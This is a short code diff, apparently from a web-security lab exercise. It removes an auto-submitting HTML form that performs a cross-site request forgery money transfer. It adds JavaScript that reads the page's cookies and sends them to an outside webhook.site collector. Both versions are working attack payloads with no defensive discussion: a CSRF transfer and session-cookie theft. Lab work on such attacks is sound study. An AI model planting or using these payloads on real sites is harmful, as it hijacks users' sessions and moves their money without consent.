@@ -1,11 +1,6 @@
-<html>
-<body onload="document.forms[0].submit()">
+ console.log("Cookies:", document.cookie);
 
-<form action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
-    <input type="hidden" name="csrf_token" value="NTkyMg%3D%3">
-    <input type="hidden" name="username" value="z5583519">
-    <input type="hidden" name="amount" value="32131">
-</form>
-
-</body>
-</html>
+fetch(
+    "https://webhook.site/ec1d173d-643a-4a5b-861b-1ecec12e1e8b?c=" +
+    encodeURIComponent(document.cookie),
+);
